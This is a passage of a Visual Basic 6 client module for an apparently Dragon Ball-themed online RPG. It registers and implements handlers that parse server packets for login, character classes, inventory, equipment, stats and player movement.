Attribute VB_Name = "modHandleData"
Option Explicit

' ******************************************
' ** Parses and handles String packets    **
' ******************************************
Public Function GetAddress(FunAddr As Long) As Long
    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    GetAddress = FunAddr
    
    ' Error handler
    Exit Function
errorhandler:
    HandleError "GetAddress", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Function
End Function

Public Sub InitMessages()
    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    HandleDataSub(SAlertMsg) = GetAddress(AddressOf HandleAlertMsg)
    HandleDataSub(SLoginOk) = GetAddress(AddressOf HandleLoginOk)
    HandleDataSub(SNewCharClasses) = GetAddress(AddressOf HandleNewCharClasses)
    HandleDataSub(SClassesData) = GetAddress(AddressOf HandleClassesData)
    HandleDataSub(SInGame) = GetAddress(AddressOf HandleInGame)
    HandleDataSub(SPlayerInv) = GetAddress(AddressOf HandlePlayerInv)
    HandleDataSub(SPlayerInvUpdate) = GetAddress(AddressOf HandlePlayerInvUpdate)
    HandleDataSub(SPlayerWornEq) = GetAddress(AddressOf HandlePlayerWornEq)
    HandleDataSub(SPlayerHp) = GetAddress(AddressOf HandlePlayerHp)
    HandleDataSub(SPlayerMp) = GetAddress(AddressOf HandlePlayerMp)
    HandleDataSub(SPlayerStats) = GetAddress(AddressOf HandlePlayerStats)
    HandleDataSub(SPlayerData) = GetAddress(AddressOf HandlePlayerData)
    HandleDataSub(SPlayerMove) = GetAddress(AddressOf HandlePlayerMove)
    HandleDataSub(SNpcMove) = GetAddress(AddressOf HandleNpcMove)
    HandleDataSub(SPlayerDir) = GetAddress(AddressOf HandlePlayerDir)
    HandleDataSub(SNpcDir) = GetAddress(AddressOf HandleNpcDir)
    HandleDataSub(SPlayerXY) = GetAddress(AddressOf HandlePlayerXY)
    HandleDataSub(SPlayerXYMap) = GetAddress(AddressOf HandlePlayerXYMap)
    HandleDataSub(SAttack) = GetAddress(AddressOf HandleAttack)
    HandleDataSub(SNpcAttack) = GetAddress(AddressOf HandleNpcAttack)
    HandleDataSub(SCheckForMap) = GetAddress(AddressOf HandleCheckForMap)
    HandleDataSub(SMapData) = GetAddress(AddressOf HandleMapData)
    HandleDataSub(SMapItemData) = GetAddress(AddressOf HandleMapItemData)
    HandleDataSub(SMapNpcData) = GetAddress(AddressOf HandleMapNpcData)
    HandleDataSub(SMapDone) = GetAddress(AddressOf HandleMapDone)
    HandleDataSub(SGlobalMsg) = GetAddress(AddressOf HandleGlobalMsg)
    HandleDataSub(SAdminMsg) = GetAddress(AddressOf HandleAdminMsg)
    HandleDataSub(SPlayerMsg) = GetAddress(AddressOf HandlePlayerMsg)
    HandleDataSub(SMapMsg) = GetAddress(AddressOf HandleMapMsg)
    HandleDataSub(SSpawnItem) = GetAddress(AddressOf HandleSpawnItem)
    HandleDataSub(SUpdateItem) = GetAddress(AddressOf HandleUpdateItem)
    HandleDataSub(SSpawnNpc) = GetAddress(AddressOf HandleSpawnNpc)
    HandleDataSub(SNpcDead) = GetAddress(AddressOf HandleNpcDead)
    HandleDataSub(SUpdateNpc) = GetAddress(AddressOf HandleUpdateNpc)
    HandleDataSub(SMapKey) = GetAddress(AddressOf HandleMapKey)
    HandleDataSub(SUpdateShop) = GetAddress(AddressOf HandleUpdateShop)
    HandleDataSub(SUpdateSpell) = GetAddress(AddressOf HandleUpdateSpell)
    HandleDataSub(SSpells) = GetAddress(AddressOf HandleSpells)
    HandleDataSub(SLeft) = GetAddress(AddressOf HandleLeft)
    HandleDataSub(SResourceCache) = GetAddress(AddressOf HandleResourceCache)
    HandleDataSub(SUpdateResource) = GetAddress(AddressOf HandleUpdateResource)
    HandleDataSub(SSendPing) = GetAddress(AddressOf HandleSendPing)
    HandleDataSub(SActionMsg) = GetAddress(AddressOf HandleActionMsg)
    HandleDataSub(SPlayerEXP) = GetAddress(AddressOf HandlePlayerExp)
    HandleDataSub(SBlood) = GetAddress(AddressOf HandleBlood)
    HandleDataSub(SUpdateAnimation) = GetAddress(AddressOf HandleUpdateAnimation)
    HandleDataSub(SAnimation) = GetAddress(AddressOf HandleAnimation)
    HandleDataSub(SMapNpcVitals) = GetAddress(AddressOf HandleMapNpcVitals)
    HandleDataSub(SCooldown) = GetAddress(AddressOf HandleCooldown)
    HandleDataSub(SClearSpellBuffer) = GetAddress(AddressOf HandleClearSpellBuffer)
    HandleDataSub(SSayMsg) = GetAddress(AddressOf HandleSayMsg)
    HandleDataSub(SOpenShop) = GetAddress(AddressOf HandleOpenShop)
    HandleDataSub(SResetShopAction) = GetAddress(AddressOf HandleResetShopAction)
    HandleDataSub(SStunned) = GetAddress(AddressOf HandleStunned)
    HandleDataSub(SMapWornEq) = GetAddress(AddressOf HandleMapWornEq)
    HandleDataSub(SBank) = GetAddress(AddressOf HandleBank)
    HandleDataSub(STrade) = GetAddress(AddressOf HandleTrade)
    HandleDataSub(SCloseTrade) = GetAddress(AddressOf HandleCloseTrade)
    HandleDataSub(STradeUpdate) = GetAddress(AddressOf HandleTradeUpdate)
    HandleDataSub(STradeStatus) = GetAddress(AddressOf HandleTradeStatus)
    HandleDataSub(STarget) = GetAddress(AddressOf HandleTarget)
    HandleDataSub(SHotbar) = GetAddress(AddressOf HandleHotbar)
    HandleDataSub(SHighIndex) = GetAddress(AddressOf HandleHighIndex)
    HandleDataSub(SSound) = GetAddress(AddressOf HandleSound)
    HandleDataSub(STradeRequest) = GetAddress(AddressOf HandleTradeRequest)
    HandleDataSub(SPartyInvite) = GetAddress(AddressOf HandlePartyInvite)
    HandleDataSub(SPartyUpdate) = GetAddress(AddressOf HandlePartyUpdate)
    HandleDataSub(SPartyVitals) = GetAddress(AddressOf HandlePartyVitals)
    HandleDataSub(SPlayBGM) = GetAddress(AddressOf HandlePlayBGM)
    HandleDataSub(SPlaySound) = GetAddress(AddressOf HandlePlaySound)
    HandleDataSub(SFadeoutBGM) = GetAddress(AddressOf HandleFadeoutBGM)
    HandleDataSub(SStopSound) = GetAddress(AddressOf HandleStopSound)
    HandleDataSub(SSwitchesAndVariables) = GetAddress(AddressOf HandleSwitchesAndVariables)
    HandleDataSub(SChatBubble) = GetAddress(AddressOf HandleChatBubble)
    HandleDataSub(SSpecialEffect) = GetAddress(AddressOf HandleSpecialEffect)
    HandleDataSub(SFlash) = GetAddress(AddressOf HandleFlash)
    HandleDataSub(SEventData) = GetAddress(AddressOf Events_HandleEventData)
    HandleDataSub(SEventUpdate) = GetAddress(AddressOf Events_HandleEventUpdate)
    HandleDataSub(SUpdateEffect) = GetAddress(AddressOf HandleUpdateEffect)
    HandleDataSub(SEffect) = GetAddress(AddressOf HandleEffect)
    HandleDataSub(SCreateProjectile) = GetAddress(AddressOf HandleCreateProjectile)
    HandleDataSub(SSendNews) = GetAddress(AddressOf HandleSendNews)
    HandleDataSub(SFly) = GetAddress(AddressOf HandleFly)
    HandleDataSub(SSpecialAction) = GetAddress(AddressOf HandleSpecialAction)
    HandleDataSub(SSpellBuffer) = GetAddress(AddressOf HandleSpellBuffer)
    HandleDataSub(SShenlong) = GetAddress(AddressOf HandleShenlong)
    HandleDataSub(STransporte) = GetAddress(AddressOf HandleTransporte)
    HandleDataSub(SMapNpcDataXY) = GetAddress(AddressOf HandleMapNpcDataXY)
    HandleDataSub(SUpdateQuest) = GetAddress(AddressOf HandleUpdatequest)
    HandleDataSub(SQuestEditor) = GetAddress(AddressOf HandleQuestEditor)
    HandleDataSub(SPlayerQuests) = GetAddress(AddressOf HandlePlayerQuests)
    HandleDataSub(SPlayerQuest) = GetAddress(AddressOf HandlePlayerQuest)
    HandleDataSub(SPlayerInfo) = GetAddress(AddressOf HandlePlayerInfo)
    HandleDataSub(SOpenRefine) = GetAddress(AddressOf HandleOpenRefine)
    HandleDataSub(SPlanets) = GetAddress(AddressOf HandlePlanets)
    HandleDataSub(SMatchData) = GetAddress(AddressOf HandleMatchData)
    HandleDataSub(SUpdateGuild) = GetAddress(AddressOf HandleUpdateGuild)
    HandleDataSub(SSaibamans) = GetAddress(AddressOf HandleSaibaman)
    HandleDataSub(SConquistas) = GetAddress(AddressOf HandleConquistas)
    HandleDataSub(SSupport) = GetAddress(AddressOf HandleSupport)
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "InitMessages", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Sub HandleData(ByRef data() As Byte)
Dim buffer As clsBuffer
Dim MsgType As Long

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler

    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    MsgType = buffer.ReadLong
    
    If MsgType < 0 Then
        DestroyGame
        Exit Sub
    End If

    If MsgType >= SMSG_COUNT Then
        DestroyGame
        Exit Sub
    End If
    
    CallWindowProc HandleDataSub(MsgType), 1, buffer.ReadBytes(buffer.Length), 0, 0
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleData", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Sub HandleAlertMsg(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Msg As String
Dim buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    MsgScreen = buffer.ReadString 'Parse(1)
    
    Set buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleAlertMsg", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Sub HandleLoginOk(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    ' save options
    Options.savePass = frmMenu.chkPass.value
    Options.Username = Trim$(frmMenu.txtLUser.Text)

    If frmMenu.chkPass.value = 0 Then
        Options.Password = vbNullString
    Else
        Options.Password = Trim$(frmMenu.txtLPass.Text)
    End If
    
    SaveOptions
    
    ' Now we can receive game data
    MyIndex = buffer.ReadLong
    
    ' player high index
    Player_HighIndex = buffer.ReadLong
    
    MoedaZ = buffer.ReadLong
    
    isLogging = False
    
    Set buffer = Nothing
    Call SetStatus("Receiving game data...")
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleLoginOk", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Sub HandleNewCharClasses(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim n As Long
Dim i As Long
Dim z As Long, X As Long
Dim buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    n = 1
    ' Max classes
    Max_Classes = buffer.ReadLong
    ReDim Class(1 To Max_Classes)
    n = n + 1

    For i = 1 To Max_Classes

        With Class(i)
            .name = buffer.ReadString
            .Vital(Vitals.HP) = buffer.ReadLong
            .Vital(Vitals.MP) = buffer.ReadLong
            
            ' get array size
            z = buffer.ReadLong
            ' redim array
            ReDim .MaleSprite(0 To z)
            ' loop-receive data
            For X = 0 To z
                .MaleSprite(X) = buffer.ReadLong
            Next
            
            ' get array size
            z = buffer.ReadLong
            ' redim array
            ReDim .FemaleSprite(0 To z)
            ' loop-receive data
            For X = 0 To z
                .FemaleSprite(X) = buffer.ReadLong
            Next
            
            For X = 1 To Stats.Stat_Count - 1
                .Stat(X) = buffer.ReadLong
            Next
        End With

        n = n + 10
    Next

    Set buffer = Nothing
    
    ' Used for if the player is creating a new character
    'frmMenu.visible = True
    'frmMenu.picCharacter.visible = True
    'frmMenu.picCredits.visible = False
    'frmMenu.picLogin.visible = False
    'frmMenu.picRegister.visible = False
    'frmMenu.cmbClass.Clear
    'For I = 1 To Max_Classes
    '    frmMenu.cmbClass.AddItem Trim$(Class(I).name)
    'Next

    'frmMenu.cmbClass.ListIndex = 0
    'n = frmMenu.cmbClass.ListIndex + 1
    
    NewCharTick = GetTickCount
    newCharSprite = 0
    newCharHair = 1
    MsgScreen = ""
    Flying = 900
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleNewCharClasses", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Sub HandleClassesData(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim n As Long
Dim i As Long
Dim z As Long, X As Long
Dim buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    n = 1
    ' Max classes
    Max_Classes = buffer.ReadLong 'CByte(Parse(n))
    ReDim Class(1 To Max_Classes)
    n = n + 1

    For i = 1 To Max_Classes

        With Class(i)
            .name = buffer.ReadString 'Trim$(Parse(n))
            .Vital(Vitals.HP) = buffer.ReadLong 'CLng(Parse(n + 1))
            .Vital(Vitals.MP) = buffer.ReadLong 'CLng(Parse(n + 2))
            
            ' get array size
            z = buffer.ReadLong
            ' redim array
            ReDim .MaleSprite(0 To z)
            ' loop-receive data
            For X = 0 To z
                .MaleSprite(X) = buffer.ReadLong
            Next
            
            ' get array size
            z = buffer.ReadLong
            ' redim array
            ReDim .FemaleSprite(0 To z)
            ' loop-receive data
            For X = 0 To z
                .FemaleSprite(X) = buffer.ReadLong
            Next
                            
            For X = 1 To Stats.Stat_Count - 1
                .Stat(X) = buffer.ReadLong
            Next
        End With

        n = n + 10
    Next

    Set buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleClassesData", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Sub HandleInGame(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Call PlaySound("kamehameha.mp3", -1, -1)
    InGameTick = GetTickCount
    MsgScreen = printf("Logado com sucesso! aguarde enquanto o jogo é carregado")
    DllHand = vbNullString
    VerificarAntiHack True
    SendAntiHackData DllHand
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleInGame", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Sub HandlePlayerInv(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim n As Long
Dim i As Long
Dim buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    For n = 1 To 7
        HaveDragonball(n) = False
    Next n
    
    n = 1
    
    MoedasZ = 0

    For i = 1 To MAX_INV
        Call SetPlayerInvItemNum(MyIndex, i, buffer.ReadLong)
        Call SetPlayerInvItemValue(MyIndex, i, buffer.ReadLong)
        '   Check for dragonballs
        If GetPlayerInvItemNum(MyIndex, i) > 0 Then
            If Item(GetPlayerInvItemNum(MyIndex, i)).Type = ITEM_TYPE_DRAGONBALL Then
                HaveDragonball(Item(GetPlayerInvItemNum(MyIndex, i)).Dragonball) = True
            End If
            If LCase(Trim$(Item(GetPlayerInvItemNum(MyIndex, i)).name)) = "moeda z" Then
                MoedasZ = GetPlayerInvItemValue(MyIndex, i)
            End If
        End If
        n = n + 2
    Next
    
    ' changes to inventory, need to clear any drop menu
    sDialogue = vbNullString
    GUIWindow(GUI_CURRENCY).visible = False
    inChat = False
    tmpCurrencyItem = 0
    CurrencyMenu = 0 ' clear

    Set buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePlayerInv", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Sub HandlePlayerInvUpdate(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim n As Long
Dim buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    n = buffer.ReadLong 'CLng(Parse(1))
    Call SetPlayerInvItemNum(MyIndex, n, buffer.ReadLong) 'CLng(Parse(2)))
    Call SetPlayerInvItemValue(MyIndex, n, buffer.ReadLong) 'CLng(Parse(3)))

    ' changes, clear drop menu
        sDialogue = vbNullString
    GUIWindow(GUI_CURRENCY).visible = False
    inChat = False
    tmpCurrencyItem = 0
    CurrencyMenu = 0 ' clear
    Set buffer = Nothing
    
    If GetPlayerInvItemNum(MyIndex, n) > 0 Then
        If LCase(Trim$(Item(GetPlayerInvItemNum(MyIndex, n)).name)) = "moeda z" Then
            MoedasZ = GetPlayerInvItemValue(MyIndex, n)
        End If
    End If
    
    For n = 1 To 7
        HaveDragonball(n) = False
    Next n
    
    For n = 1 To MAX_INV
        If GetPlayerInvItemNum(MyIndex, n) > 0 Then
            '   Check for dragonballs
            If Item(GetPlayerInvItemNum(MyIndex, n)).Type = ITEM_TYPE_DRAGONBALL Then
                HaveDragonball(Item(GetPlayerInvItemNum(MyIndex, n)).Dragonball) = True
            End If
        End If
    Next n
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePlayerInvUpdate", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Sub HandlePlayerWornEq(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    Call SetPlayerEquipment(MyIndex, buffer.ReadLong, Armor)
    Call SetPlayerEquipment(MyIndex, buffer.ReadLong, Weapon)
    Call SetPlayerEquipment(MyIndex, buffer.ReadLong, Helmet)
    Call SetPlayerEquipment(MyIndex, buffer.ReadLong, Shield)
    
    ' changes to inventory, need to clear any drop menu
    sDialogue = vbNullString
    GUIWindow(GUI_CURRENCY).visible = False
    inChat = False
    tmpCurrencyItem = 0
    CurrencyMenu = 0 ' clear
    
    Set buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePlayerWornEq", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Sub HandleMapWornEq(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer
Dim playerNum As Long

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    
    buffer.WriteBytes data()
    
    playerNum = buffer.ReadLong
    Call SetPlayerEquipment(playerNum, buffer.ReadLong, Armor)
    Call SetPlayerEquipment(playerNum, buffer.ReadLong, Weapon)
    Call SetPlayerEquipment(playerNum, buffer.ReadLong, Helmet)
    Call SetPlayerEquipment(playerNum, buffer.ReadLong, Shield)
    
    Set buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleMapWornEq", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandlePlayerHp(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer
Dim TheIndex As Long

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    TheIndex = buffer.ReadLong
    Player(TheIndex).MaxVital(Vitals.HP) = buffer.ReadLong
    
    If TheIndex = MyIndex Then
        If buffer.ReadLong(False) < GetPlayerVital(MyIndex, HP) Then
            ReceiveAttack = GetTickCount
        End If
    End If
    
    Call SetPlayerVital(TheIndex, Vitals.HP, buffer.ReadLong)
    
    'If GetPlayerMaxVital(MyIndex, Vitals.HP) > 0 Then
    '    'frmMain.lblHP.Caption = Int(GetPlayerVital(MyIndex, Vitals.HP) / GetPlayerMaxVital(MyIndex, Vitals.HP) * 100) & "%"
    '    frmMain.lblHP.Caption = GetPlayerVital(MyIndex, Vitals.HP) & "/" & GetPlayerMaxVital(MyIndex, Vitals.HP)
    '    ' hp bar
    '    frmMain.imgHPBar.Width = ((GetPlayerVital(MyIndex, Vitals.HP) / HPBar_Width) / (GetPlayerMaxVital(MyIndex, Vitals.HP) / HPBar_Width)) * HPBar_Width
    'End If

    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePlayerHP", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandlePlayerMp(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    Player(MyIndex).MaxVital(Vitals.MP) = buffer.ReadLong
    Call SetPlayerVital(MyIndex, Vitals.MP, buffer.ReadLong)
    
    'If GetPlayerMaxVital(MyIndex, Vitals.MP) > 0 Then
    '    'frmMain.lblMP.Caption = Int(GetPlayerVital(MyIndex, Vitals.MP) / GetPlayerMaxVital(MyIndex, Vitals.MP) * 100) & "%"
    '    frmMain.lblMP.Caption = GetPlayerVital(MyIndex, Vitals.MP) & "/" & GetPlayerMaxVital(MyIndex, Vitals.MP)
    '    ' mp bar
    '    frmMain.imgMPBar.Width = ((GetPlayerVital(MyIndex, Vitals.MP) / SPRBar_Width) / (GetPlayerMaxVital(MyIndex, Vitals.MP) / SPRBar_Width)) * SPRBar_Width
    'End If

    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePlayerMP", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandlePlayerStats(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer
Dim i As Long

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    For i = 1 To Stats.Stat_Count - 1
        SetPlayerStat MyIndex, i, buffer.ReadLong
        SetPlayerStatPoints MyIndex, i, buffer.ReadLong
        StatNextLevel(i) = buffer.ReadLong
        StatLastLevel(i) = buffer.ReadLong
    Next
    
    Player(MyIndex).POINTS = buffer.ReadLong
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePlayerStats", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandlePlayerExp(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer
Dim i As Long
    
    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    SetPlayerExp MyIndex, buffer.ReadLong
    TNL = buffer.ReadLong
    LL = buffer.ReadLong
    Player(MyIndex).PDL = buffer.ReadLong
    SetPlayerLevel MyIndex, buffer.ReadLong
    Player(MyIndex).IsGod = buffer.ReadByte
    Player(MyIndex).GodLevel = buffer.ReadLong
    Player(MyIndex).GodExp = buffer.ReadLong
    GodNextLevel = buffer.ReadLong
    
    'frmMain.lblEXP.Caption = GetPlayerExp(Index) & "/" & TNL
    ' mp bar
    'frmMain.imgEXPBar.Width = ((GetPlayerExp(MyIndex) / EXPBar_Width) / (TNL / EXPBar_Width)) * EXPBar_Width
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePlayerExp", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandlePlayerData(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim i As Long, X As Long
Dim buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    i = buffer.ReadLong
    Call SetPlayerName(i, buffer.ReadString)
    Call SetPlayerLevel(i, buffer.ReadLong)
    Call SetPlayerPOINTS(i, buffer.ReadLong)
    Call SetPlayerSprite(i, buffer.ReadLong)
    Call SetPlayerMap(i, buffer.ReadLong)
    Call SetPlayerX(i, buffer.ReadLong)
    Call SetPlayerY(i, buffer.ReadLong)
    Call SetPlayerDir(i, buffer.ReadLong)
    Call SetPlayerAccess(i, buffer.ReadLong)
    Call SetPlayerPK(i, buffer.ReadLong)
    Call SetPlayerClass(i, buffer.ReadLong)
    Player(i).Trans = buffer.ReadLong
    Player(i).RawPDL = buffer.ReadLong
    Player(i).PDL = buffer.ReadLong
    Player(i).EsoNum = buffer.ReadLong
    Player(i).EsoTime = buffer.ReadLong
    TempPlayer(i).Fly = buffer.ReadByte
    Player(i).VIP = buffer.ReadByte
    Player(i).Hair = buffer.ReadByte
    TempPlayer(i).HairChange = buffer.ReadByte
    Player(i).Titulo = buffer.ReadLong
    Player(i).InTutorial = 1 ' buffer.ReadByte (VOCÊ NÃO VAI QUERER VER ISSO)
    buffer.ReadByte
    Player(i).Guild = buffer.ReadLong
    TempPlayer(i).AFK = buffer.ReadByte
    TempPlayer(i).speed = buffer.ReadLong
    Player(i).VIPExp = buffer.ReadLong
    If i = MyIndex Then
        PlanetService = buffer.ReadLong
    Else
        buffer.ReadLong
    End If
    
    If i = MyIndex Then
        VIPNextLevel = buffer.ReadLong
    Else
        buffer.ReadLong
    End If
    
    Player(i).Instance = buffer.ReadLong
    Player(i).NumServices = buffer.ReadLong
    Player(i).IsGod = buffer.ReadByte
    
    For X = 1 To Stats.Stat_Count - 1
        SetPlayerStat i, X, buffer.ReadLong
        SetPlayerStatPoints i, X, buffer.ReadLong
    Next
    
    Player(i).IsDead = buffer.ReadByte

    ' Check if the player is the client player
    If i = MyIndex Then
        ' Reset directions
        DirUp = False
        DirDown = False
        DirLeft = False
        DirRight = False
        DirUpLeft = False

         DirUpRight = False
    
         DirDownLeft = False
    
         DirDownRight = False
    End If

    ' Make sure they aren't walking
    TempPlayer(i).moving = 0
    TempPlayer(i).XOffSet = 0
    TempPlayer(i).YOffSet = 0
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePlayerData", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandlePlayerMove(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim i As Long
Dim X As Long
Dim Y As Long
Dim Dir As Long
Dim n As Byte
Dim buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    i = buffer.ReadLong
    X = buffer.ReadLong
    Y = buffer.ReadLong
    Dir = buffer.ReadLong
    n = buffer.ReadLong
    Call SetPlayerX(i, X)
    Call SetPlayerY(i, Y)
    Call SetPlayerDir(i, Dir)
    TempPlayer(i).XOffSet = 0
    TempPlayer(i).YOffSet = 0
    TempPlayer(i).moving = n
    TempPlayer(i).MoveLast = GetTickCount
    TempPlayer(i).MoveLastType = n
    TempPlayer(i).AFK = 0
    TempPlayer(i).LastMove = GetTickCount

    Select Case GetPlayerDir(i)
        Case DIR_UP
            TempPlayer(i).YOffSet = PIC_Y
        Case DIR_DOWN
            TempPlayer(i).YOffSet = PIC_Y * -1
        Case DIR_LEFT
            TempPlayer(i).XOffSet = PIC_X
        Case DIR_RIGHT
            TempPlayer(i).XOffSet = PIC_X * -1
        Case DIR_UP_LEFT

                 TempPlayer(i).YOffSet = PIC_Y
        
                 TempPlayer(i).XOffSet = PIC_X
        
        Case DIR_UP_RIGHT
        
                 TempPlayer(i).YOffSet = PIC_Y
        
                 TempPlayer(i).XOffSet = PIC_X * -1
        
        Case DIR_DOWN_LEFT
        
                 TempPlayer(i).YOffSet = PIC_Y * -1
        
                 TempPlayer(i).XOffSet = PIC_X
        
        Case DIR_DOWN_RIGHT
        
                 TempPlayer(i).YOffSet = PIC_Y * -1
        
                 TempPlayer(i).XOffSet = PIC_X * -1
    End Select
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePlayerMove", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleNpcMove(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim MapNpcNum As Long
Dim X As Long
Dim Y As Long
Dim Dir As Long
Dim Movement As Long
Dim buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    MapNpcNum = buffer.ReadLong
    X = buffer.ReadLong
    Y = buffer.ReadLong
    Dir = buffer.ReadLong
    Movement = buffer.ReadLong

    With TempMapNpc(MapNpcNum)
        MapNpc(MapNpcNum).X = X
